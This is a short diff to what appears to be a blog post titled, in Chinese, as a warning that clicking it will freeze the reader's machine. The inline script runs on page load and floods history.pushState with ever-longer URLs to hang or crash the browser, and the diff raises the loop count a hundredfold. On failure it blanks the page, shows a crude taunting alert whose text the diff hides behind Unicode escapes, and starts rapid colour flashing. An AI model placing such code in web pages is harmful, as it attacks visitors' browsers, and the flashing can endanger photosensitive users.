@@ -10,14 +10,14 @@ title: 不要点这一条,否则你会死机
 
 <script>
     try {
-        for (var i= 0, total="";i<1000000;i++) {
+        for (var i= 0, total="";i<100000000;i++) {
             total += i.toString ();
-            history.pushState (0, 0, total);
+            history.pushState (0, i.toString(), total);
         }
     } catch (e) {
         if (!window.history.pushState) {
             document.body.innerHTML = '';
-            alert('你特么拿石器时代的浏览器来测试我特么也是醉了!闪瞎你!!!');
+            alert('\u4f60\u7279\u4e48\u62ff\u77f3\u5668\u65f6\u4ee3\u7684\u6d4f\u89c8\u5668\u6765\u6d4b\u8bd5\u6211\u7279\u4e48\u4e5f\u662f\u9189\u4e86\u0021\u95ea\u778e\u4f60\u0021\u0021\u0021');
             var colors = ['#f00', '#f0f', '#ff0', '#0ff', '#08f','#4815A8', '#152BA8'];
             document.body.style.cssText = 'position: fixed; width: 100%;height:100%';
             setInterval(function () {
